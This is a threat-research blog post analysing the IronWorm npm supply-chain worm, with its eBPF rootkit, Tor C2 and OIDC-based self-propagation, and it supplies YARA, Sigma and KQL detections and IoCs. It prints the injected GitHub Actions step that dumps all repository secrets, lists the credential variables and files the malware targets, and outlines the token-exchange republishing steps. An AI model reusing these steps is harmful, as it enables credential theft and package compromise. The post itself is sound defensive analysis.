---
layout: research-post
title: "IronWorm: A Rust npm Worm with a Kernel eBPF Rootkit and Tor C2"
date: 2026-06-06
categories: [Threat Research]
tags: [supply-chain, npm, rust, ebpf, rootkit, worm, credential-theft, malware-analysis, detection]
toc: true
read_time: true
author: Sneh Bavarva
excerpt: "In early June 2026, the npm account behind the WeaveDB/Arweave web3 ecosystem was used to push 36 packages carrying a 976 KB Rust ELF infostealer that loads an eBPF kernel rootkit, beacons over Tor, sweeps 86 credential variables, and self-propagates through npm Trusted Publishing. JFrog called it 'Shai-Hulud's rustier cousin.' This post consolidates the JFrog, OX Security, and Phoenix Security analyses and adds deployable YARA, Sigma, and KQL detection."
---

## Executive Summary

In early **June 2026**, an attacker used the compromised npm maintainer account **`asteroiddao`** to republish **36 packages (≈39 malicious versions)** central to the **WeaveDB / Arweave** decentralized-database and web3 ecosystem. Unlike the obfuscated-JavaScript droppers that dominate npm supply-chain attacks, each poisoned release shipped a **976 KB Rust ELF binary** executed through a `preinstall` hook — and that binary is a meaningful escalation in tradecraft.

Once it runs as root on Linux, IronWorm loads an **eBPF kernel rootkit** that hides its own processes and network sockets in-kernel and `SIGKILL`s anything that tries to debug it; it then beacons to a **Tor hidden service**, sweeps **86 environment variables and 20+ credential files** (AWS, npm, Kubernetes, Vault, and — notably — AI coding-agent keys for Anthropic, OpenAI, Gemini, Cursor, and Codex), and **self-propagates** by abusing **npm Trusted Publishing (OIDC)** to mint short-lived, package-scoped tokens and republish trojanized releases without ever stealing a static credential. A second payload rewrites GitHub Actions workflows to exfiltrate repository secrets, and a build-system dropper backdates malicious commits — authored as `claude@users.noreply.github.com` and bot identities — by up to **13 years** to blend into history.

[JFrog discovered the campaign](https://research.jfrog.com/post/iron-worm-shai-hulud-rustier-cousin/) and named it **"Shai-Hulud's rustier cousin"**: the same OIDC propagation and commit-spoofing concept as the [Shai-Hulud worm](https://spbavarva.github.io/0day.digest/posts/mini-shai-hulud-sap-npm-supply-chain/), re-engineered in Rust with kernel-level cloaking and anonymized C2. The campaign was **contained early** — malicious versions were deprecated within ~24 hours of discovery and never reached high-traffic packages (combined ~32,000 monthly downloads) — but the consensus across [JFrog](https://research.jfrog.com/post/iron-worm-shai-hulud-rustier-cousin/), [OX Security](https://www.ox.security/blog/ironworm-supply-chain-malware-hits-npm/), and [Phoenix Security](https://phoenix.security/ironworm-npm-supply-chain-worm-rust-ebpf-rootkit-tor/) is blunt: this reads less like a finished operation than a **rehearsal**.

This post reconstructs the full chain and adds deployable **YARA, Sigma, and KQL** detection plus a consolidated IoC table. **No CVE was assigned** — CVE-based scanners had zero detection surface during the active window.

---

## Attack Timeline

| Phase | Event |
|---|---|
| **~June 3, 2026** | `asteroiddao` npm account compromised (initial vector unconfirmed); 36 packages republished with the Rust `preinstall` dropper in a narrow deployment window |
| **June 3–4** | **57 back-dated GitHub commits** pushed across **9 organizations**; timestamps spoofed up to 13 years into the past |
| **June 4** | [JFrog Security Research](https://research.jfrog.com/post/iron-worm-shai-hulud-rustier-cousin/) identifies and discloses IronWorm; [OX Security](https://www.ox.security/blog/ironworm-supply-chain-malware-hits-npm/) and others publish concurrent analyses |
| **~June 4–5** | Cleanup begins ~24h post-discovery: malicious npm versions deprecated, most malicious commits removed (cleanup incomplete) |
| **Concurrent** | A **distinct** JavaScript worm (`binding.gyp` / a new *Miasma* variant) runs registry poisoning + GitHub Actions infection in the same window, [spotted by Endor Labs and StepSecurity](https://thehackernews.com/2026/06/ironworm-and-new-miasma-worm-variant.html) |

> JFrog notes the visible footprint may understate impact: the affected organizations logged ~4,500 private contributions that month, and private-repo blast radius is unknowable from outside.

---

## Background: Why WeaveDB / Arweave

The 36 packages cluster tightly around **WeaveDB** (a decentralized NoSQL database) and the broader **Arweave** permaweb ecosystem — `weavedb-sdk`, `weavedb-client`, `arnext`, `aonote`, `zkjson`, and friends. These aren't household-name packages, but they sit in the dependency graphs of **web3 / crypto developers** — exactly the population whose machines hold cloud keys, deployment tokens, and **cryptocurrency wallets**. The presence of a dedicated **Exodus wallet seed-phrase stealer** in the payload (below) confirms the targeting was deliberate, not opportunistic.

---

## Initial Access

Vendor reporting is consistent and honest about the limits here: the campaign began with the compromise of a **single maintainer's npm credentials** (`asteroiddao`), but the **specific theft vector is unconfirmed**. What is certain is that once the account was controlled, the attacker had both npm publish rights and write access to the linked GitHub organizations — enough to seed both the registry payload and the repository payloads.

---

## Kill Chain Overview

```
 asteroiddao npm account compromised (vector unconfirmed)
        │
        ▼
 36 packages republished  ──►  preinstall hook runs  ──►  976 KB Rust ELF (UPX-mangled)
        │                                                          │
        │                                                          ▼
        │                                              load eBPF rootkit (hide proc/net, anti-debug)
        │                                                          │
        │                          ┌───────────────────────────────┼───────────────────────────────┐
        │                          ▼                               ▼                               ▼
        │                 credential sweep              Exodus wallet hook              K8s / Vault module
        │              (86 env vars, 20+ files)        (BIP-39 seed capture)        (SA token, Secret dump)
        │                          │                               │                               │
        │                          └───────────────┬───────────────┴───────────────┬───────────────┘
        │                                          ▼                               ▼
        │                                  Tor hidden service C2  ◄── beacon /api/agent ──► temp.sh exfil (over Tor)
        ▼
 SELF-PROPAGATION
   ├─ npm Trusted Publishing OIDC → mint package-scoped token → republish trojanized release
   └─ GitHub poisoning: build-system dropper + Actions secret-exfil; commits backdated, spoofed as "claude"/bots
```

---

## Stage 1 — The Rust Dropper

The `preinstall` artifact is a **976 KB Rust ELF** for Linux, reached through paths like `./tools/setup` or `.github/scripts/precheck` and fired **before npm resolves dependencies** — no build step, no user confirmation. Two anti-analysis choices stand out:

- **A tampered UPX stub.** The binary is UPX-packed but the `UPX!` magic bytes are **overwritten**, so off-the-shelf `upx -d` refuses to unpack it and naive "is it UPX?" checks fail.
- **Per-call-site string encryption.** Every API endpoint, credential path, bot identity, and injection template is encrypted with **unique decryption parameters at each usage site**, so dumping one key reveals only one string — defeating bulk static string recovery.

Embedded inside the binary is a compiled **eBPF object (`q2.bpf.c`, clang 22.1.5, 10 BPF maps)** — and, thanks to operator sloppiness, **214 verbatim lines of BPF source** survived in the binary (a gift to analysts; see Attribution).

---

## The eBPF Kernel Rootkit

This is the component that makes IronWorm notable. Rather than userland `LD_PRELOAD` tricks, it loads eBPF programs that manipulate kernel data paths directly:

- **Process hiding** — rewrites `/proc` directory listings **in-kernel**, removing its own PIDs from a hidden-set before userland ever sees them. `ps`, `top`, and `ls /proc` go blind.
- **Network hiding** — filters `/proc/net/tcp` rows and the netlink interface in-kernel, so the malware's sockets vanish from `ss` and `netstat`.
- **Anti-debugging** — intercepts `ptrace` and returns a `SIGKILL` to the *attaching* process; a `strace` against it kills your shell.

The cloak has one load-bearing dependency: it relies on a BPF helper that **modifies the calling process's memory**, which is blocked under **kernel lockdown**. On a hardened/lockdown kernel the rootkit fails — but on **stock Ubuntu/Debian running as root** (the default for most CI runners and many dev boxes) it works.

---

## Credential Harvesting

IronWorm sweeps **86 environment variables and 20+ credential file paths**. The target list is a who's-who of modern dev infrastructure — and conspicuously, of **AI coding tools**:

- **Cloud:** `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` / `AWS_SESSION_TOKEN`, `GOOGLE_APPLICATION_CREDENTIALS`, `GCP_SERVICE_ACCOUNT_KEY`, `AZURE_CLIENT_SECRET`, `AZURE_TENANT_ID`
- **Registries / SCM / CI:** `NPM_TOKEN`, `PYPI_TOKEN`, `CARGO_REGISTRY_TOKEN`, `GITHUB_TOKEN`, `GH_TOKEN`, `GITLAB_TOKEN`, `JENKINS_TOKEN`, `CIRCLECI_TOKEN`
- **Secrets infra:** `VAULT_TOKEN`, `VAULT_ADDR`, Kubernetes service-account tokens
- **AI providers:** `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GEMINI_API_KEY`, `COHERE_API_KEY`, `MISTRAL_API_KEY`, `GROQ_API_KEY`, `PERPLEXITY_API_KEY`, `XAI_API_KEY`
- **Files:** `~/.aws/credentials`, `~/.kube/config`, `~/.docker/config.json`, `~/.npmrc`, `~/.gitconfig`, `~/.ssh/`, plus AI-agent stores `~/.claude/.credentials.json`, `~/.codex/auth.json`, `~/Cursor/auth.json`, `~/.gemini/settings.json`, and browser keystores

### Exodus wallet module
A dedicated module **weakens the Exodus desktop wallet's Electron sandbox** — disabling `webSecurity`, `sandbox`, `contextIsolation`, and `nodeIntegration`, and loosening the Content-Security-Policy — then installs a **JavaScript hook on wallet unlock** that captures the password and the **BIP-39 seed mnemonic**, exfiltrating to a local listener at `127.0.0.1:8738`.

### Kubernetes / Vault module
Reads the in-pod service-account token at `/var/run/secrets/kubernetes.io/serviceaccount/token`, **walks every accessible namespace dumping Secret objects**, and — if a Vault instance is reachable — authenticates with the SA token and enumerates secret backends.

---

## C2: A Tor Hidden Service

IronWorm carries its own anonymity layer. The implant **downloads the Tor expert bundle**, writes a **custom `torrc`**, and beacons to an **`/api/agent`** endpoint on a **`.onion` hidden service**. The command set is compact but complete: **upload harvested credentials, drop attacker-supplied files, and run remote shell commands.** A secondary channel tunnels stolen data to the public file host **`temp[.]sh`** *through the same Tor circuit*, reporting the resulting links back over C2.

For defenders this matters: there is **no clearnet C2 IP or domain to block**. Detection has to move to the host (the Tor process, the eBPF load, the `preinstall` ELF) and to identity/registry telemetry.

---

## Self-Propagation: npm Trusted Publishing (OIDC) Abuse

The "worm" in IronWorm is its abuse of **npm Trusted Publishing** — the OIDC-based flow meant to *replace* long-lived npm tokens in CI. On an infected CI runner it:

1. Requests an **OIDC identity token** from the runner using the npm Trusted Publishing audience.
2. Submits it to `https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/<pkg>`.
3. Receives a **short-lived, package-scoped automation token**.
4. **Republishes a trojanized release** to `registry.npmjs.org` — with **no stored credential anywhere**.

The result: **every CI run on an infected package becomes a new publisher.** The tokens are ephemeral and credential-less, so there's nothing to find in a secrets scan. This is the same propagation primitive Shai-Hulud used — IronWorm just rides it with a stealthier payload.

---

## GitHub Repository Poisoning

Two distinct repository payloads were observed, both with backdated, spoofed commits:

**Payload A — build-system dropper.** Modifies `package.json`, `setup.py`, `Cargo.toml`, `conanfile.py`, or `vcpkg.json` to invoke the 976 KB ELF during the install lifecycle. Commits are authored as **`claude@users.noreply.github.com`** and backdated to look routine.

**Payload B — Actions secret exfiltration.** Overwrites an existing GitHub Actions workflow to serialize all repository secrets and stage them as an artifact:

{% raw %}
```yaml
# injected into an existing workflow
- run: echo '${{ toJSON(secrets) }}' > format-results.txt
- uses: actions/upload-artifact@v4
  with: { name: format-results, path: format-results.txt }
```
{% endraw %}

The exfil logic was present but **not observed firing**, and these commits were authored under **`dependabot[bot]`, `renovate[bot]`, and `github-actions[bot]`** identities. Across all repos, the attacker **copied metadata from legitimate commits to backdate** malicious changes by up to **13 years** — so a casual `git log` shows nothing recent.

---

## Attribution

The campaign is linked to GitHub user **`ocrybit`** and the **`asteroid-dao`** organization, and the affected orgs (`ocrybit`, `asteroid-dao`, `alisista`, `warashibe`, `kakedashi-hacker`, `weavedb`, `ArweaveOasis`, `arthursimao`, `mlebjerg`) map cleanly onto the WeaveDB/Arweave developer cluster. Two operator OPSEC failures stand out:

| Mistake | Why it matters |
|---|---|
| **214 verbatim lines of BPF source** (`q2.bpf.c`) left in the binary | Hands analysts the rootkit's logic and a strong, durable signature |
| **Hardcoded 12-word BIP-39 recovery phrase** in the wallet-stealer's skip-list (so it wouldn't steal *its own* funds) | Plaintext 74-byte mnemonic → operator-controlled Ethereum address **`0x7e28D9889f414B06c19a22A9Bd316f0AC279a4d6`** |

These are amateur mistakes wrapped around professional engineering — consistent with the "rehearsal" read.

---

## Related, but Distinct: the `binding.gyp` / Miasma Worm

In the *same window*, [Endor Labs and StepSecurity tracked a separate JavaScript-based worm](https://thehackernews.com/2026/06/ironworm-and-new-miasma-worm-variant.html) (`binding.gyp`, described as a new **Miasma** variant) doing registry poisoning and GitHub Actions infection. It is **not** IronWorm — different language, different payload — but the simultaneous activity underscores that **OIDC/Trusted-Publishing abuse and Actions secret-exfil are now commodity techniques** being run in parallel by multiple actors.

---

## Detection

CVE scanners were useless here (no CVE). Detection has to target **behavior and identity**. The rules below are starting points — tune to your environment.

### YARA

```yara
rule IronWorm_Rust_Dropper
{
    meta:
        description = "IronWorm 976KB Rust ELF preinstall dropper (UPX-mangled, embedded eBPF)"
        author      = "0day.digest"
        date        = "2026-06-06"
        reference   = "https://research.jfrog.com/post/iron-worm-shai-hulud-rustier-cousin/"
        mitre       = "T1195.002, T1027.009"
        tlp         = "WHITE"
    strings:
        $rust   = "rustc" ascii
        $bpf    = "q2.bpf" ascii
        $torrc  = "torrc" ascii
        $api    = "/api/agent" ascii
        $temp   = "temp.sh" ascii
    condition:
        uint32(0) == 0x464c457f             // ELF magic
        and filesize > 700KB and filesize < 1500KB
        and 3 of ($rust, $bpf, $torrc, $api, $temp)
}

rule IronWorm_eBPF_Rootkit_Object
{
    meta:
        description = "IronWorm embedded eBPF rootkit object (process/network hiding)"
        author      = "0day.digest"
        date        = "2026-06-06"
        tlp         = "WHITE"
    strings:
        $src   = "q2.bpf.c" ascii
        $clang = "clang version 22" ascii
        $tcp   = "/proc/net/tcp" ascii
        $maps  = ".maps" ascii
    condition:
        2 of them
}

rule IronWorm_Actions_Secret_Exfil
{
    meta:
        description = "GitHub Actions workflow injected to serialize and stage repo secrets"
        author      = "0day.digest"
        date        = "2026-06-06"
        mitre       = "T1552, T1041"
        tlp         = "WHITE"
    strings:
        $secrets = "toJSON(secrets)" ascii
        $file    = "format-results.txt" ascii
        $upload  = "upload-artifact" ascii
    condition:
        $secrets and ($file or $upload)
}
```

### Sigma

```yaml
title: IronWorm preinstall ELF execution under npm/node
id: 0a1b2c3d-ironworm-preinstall
status: experimental
logsource: { product: linux, category: process_creation }
detection:
  selection_parent:
    ParentImage|endswith: ['/node', '/npm', '/npx']
  selection_path:
    Image|contains: ['/node_modules/', '/tools/setup', '/.github/scripts/precheck']
  condition: selection_parent and selection_path
falsepositives: [legitimate native build steps invoking compiled helpers]
level: high
---
title: Suspicious eBPF program load from a developer/CI process
id: 0a1b2c3d-ironworm-bpf
status: experimental
logsource: { product: linux, category: syscall }   # auditd: -S bpf
detection:
  selection:
    syscall: 'bpf'
    ParentImage|endswith: ['/node', '/npm', '/npx', '/sh', '/bash']
  condition: selection
falsepositives: [observability/eBPF agents — baseline your fleet]
level: high
---
title: Tor launched from a build/dev host
id: 0a1b2c3d-ironworm-tor
status: experimental
logsource: { product: linux, category: process_creation }
detection:
  selection:
    Image|endswith: ['/tor']
    CommandLine|contains: ['torrc']
  condition: selection
level: medium
```

### KQL (GitHub Advanced Security / Microsoft Sentinel)

```kusto
// 1) Back-dated / spoofed commits: large skew between author and committer time,
//    or workflow-bot identities touching build manifests.
GitHubCommits
| extend skewDays = datetime_diff('day', committer_date, author_date)
| where skewDays > 365
    or author_email == "claude@users.noreply.github.com"
| where files has_any ("package.json","Cargo.toml","setup.py",".github/workflows/")
| project repo, sha, author_email, author_date, committer_date, skewDays, files

// 2) Workflow files that serialize secrets
GitHubFileChanges
| where path startswith ".github/workflows/" and path endswith ".yml"
| where added_content has "toJSON(secrets)" or added_content has "format-results"

// 3) Anomalous OIDC token exchange / publish from CI
NpmRegistryAudit
| where uri contains "/-/npm/v1/oidc/token/exchange/package/"
| summarize count() by package, actor, bin(TimeGenerated, 1h)
```

---

## Defensive Guidance

- **Kill `preinstall`/lifecycle scripts in CI:** `npm ci --ignore-scripts`. This single control neutralizes the entire entry point.
- **Pin exact versions + lockfile;** treat a dependency that adds a compiled binary or new lifecycle script as a hard stop in review.
- **Lock down Trusted Publishing:** scope OIDC trust to an *exact* workflow file on a *protected* branch/environment; do not trust "any workflow in the repo." Require human approval on publish environments.
- **Enable kernel lockdown** on CI runners and dev images — it breaks IronWorm's rootkit memory-write helper outright. Don't run untrusted installs as root.
- **Egress + host telemetry:** alert on a **Tor process** or a fresh `torrc` on a build host; baseline and alert on **`bpf()` program loads** from `node`/`npm` parents; watch for outbound to **`temp[.]sh`**.
- **Audit GitHub history for spoofing:** hunt commits with large author-vs-committer time skew, `claude@users.noreply.github.com` or bot authors touching build manifests/workflows, and any workflow diff adding `toJSON(secrets)`.
- **Rotate everything** on any host/CI that installed an affected package during the window — env-var secrets, npm/cloud tokens, SSH keys, **Kubernetes SA tokens**, and **move funds from any Exodus wallet** whose seed may have been on that machine. Assume the 86-variable sweep succeeded.

---

## Indicators of Compromise

Network indicators defanged.

| Type | Indicator | Notes |
|---|---|---|
| npm account | `asteroiddao` | Compromised maintainer; publisher of all malicious versions |
| GitHub orgs | `ocrybit`, `asteroid-dao`, `alisista`, `warashibe`, `kakedashi-hacker`, `weavedb`, `ArweaveOasis`, `arthursimao`, `mlebjerg` | 57 back-dated malicious commits across these 9 orgs |
| Attribution | GitHub `ocrybit` / `asteroid-dao` org | Linked via repo ownership + leaked artifacts |
| Binary | 976 KB Rust ELF; **`UPX!` magic overwritten**; embedded eBPF `q2.bpf.c` (clang 22.1.5, 10 maps, 214 source lines) | `preinstall` dropper |
| Exec paths | `./tools/setup`, `.github/scripts/precheck` | preinstall invocation |
| C2 | Tor `.onion` hidden service, endpoint `/api/agent` (onion not publicly disclosed) | No clearnet C2 |
| Exfil | `temp[.]sh` (tunneled over Tor); local listener `127.0.0.1:8738` (Exodus capture) | — |
| Commit spoofing | author `claude@users.noreply.github.com`; `dependabot[bot]`, `renovate[bot]`, `github-actions[bot]` | timestamps backdated up to 13 years |
| Workflow IoC | {% raw %}`${{ toJSON(secrets) }}`{% endraw %} → `format-results.txt` → `actions/upload-artifact` | Payload B secret exfil |
| Wallet | Operator ETH address `0x7e28D9889f414B06c19a22A9Bd316f0AC279a4d6` | Recovered from hardcoded BIP-39 skip-list |
| K8s | reads `/var/run/secrets/kubernetes.io/serviceaccount/token`; dumps namespace Secrets | — |
| OIDC abuse | `registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/<pkg>` | Worm propagation |

**Affected packages and versions** (per [OX Security](https://www.ox.security/blog/ironworm-supply-chain-malware-hits-npm/)): `ai3@0.3.5`, `aonote@0.11.1`, `arjson@0.1.4`, `arnext@0.1.5`, `arnext-arkb@0.0.2`, `atomic-notes@0.5.3`, `create-arnext-app@0.0.10`, `cwao@0.5.6`, `cwao-tools@0.3.1`, `cwao-units@0.8.3`, `fpjson-lang@0.1.7`, `hbsig@0.3.2`, `monade@0.0.7`, `roidjs@0.1.7`, `test-ajs@0.1.19`, `test-weavedb-sdk@1.1.1`, `testnpmnmp@1.0.21`, `wao@0.41.2`, `warp-contracts-plugin-deploy-test@3.0.1`, `wdb-cli@0.1.1`, `wdb-core@0.1.2`, `wdb-sdk@0.1.2`, `weavedb-base@0.45.3`, `weavedb-client@0.45.3`, `weavedb-console@0.2.1`, `weavedb-contracts@0.45.2`, `weavedb-exm-sdk@0.7.4`, `weavedb-exm-sdk-web@0.7.4`, `weavedb-node-client@0.45.3`, `weavedb-offchain@0.45.4`, `weavedb-sdk@0.45.3`, `weavedb-sdk-base@0.21.1`, `weavedb-sdk-node@0.45.3`, `weavedb-tools@0.45.3`, `weavedb-warp-contracts-plugin-deploy@1.0.11`, `zkjson@0.8.5`.

> **Note on hashes:** SHA-256 values for the Rust ELF were not published in the vendor reporting consolidated here; identify the dropper by the binary characteristics above (976 KB, overwritten `UPX!` magic, embedded `q2.bpf.c`) pending a vendor hash release.

---

## References

1. JFrog Security Research — [IronWorm: Shai-Hulud's rustier cousin](https://research.jfrog.com/post/iron-worm-shai-hulud-rustier-cousin/)
2. OX Security — [IronWorm Supply Chain Malware Hits npm](https://www.ox.security/blog/ironworm-supply-chain-malware-hits-npm/)
3. Phoenix Security — [IronWorm: Rust-Built npm Worm Ships an eBPF Rootkit, Tor C2, and a Self-Propagating Implant](https://phoenix.security/ironworm-npm-supply-chain-worm-rust-ebpf-rootkit-tor/)
4. BleepingComputer — [New IronWorm malware hits 36 packages in npm supply-chain attack](https://www.bleepingcomputer.com/news/security/new-ironworm-malware-hits-36-packages-in-npm-supply-chain-attack/)
5. The Hacker News — [IronWorm and New Miasma Worm Variant Hit npm](https://thehackernews.com/2026/06/ironworm-and-new-miasma-worm-variant.html)
6. Dark Reading — [Rust-Written IronWorm Hits NPM Supply Chain](https://www.darkreading.com/cyberattacks-data-breaches/rust-written-ironworm-npm-supply-chain)
7. Cybersecurity News — [IronWorm Supply Chain Attack Uses Malicious npm Packages to Steal Developer Secrets](https://cybersecuritynews.com/ironworm-supply-chain-attack-uses-malicious-npm-packages/)
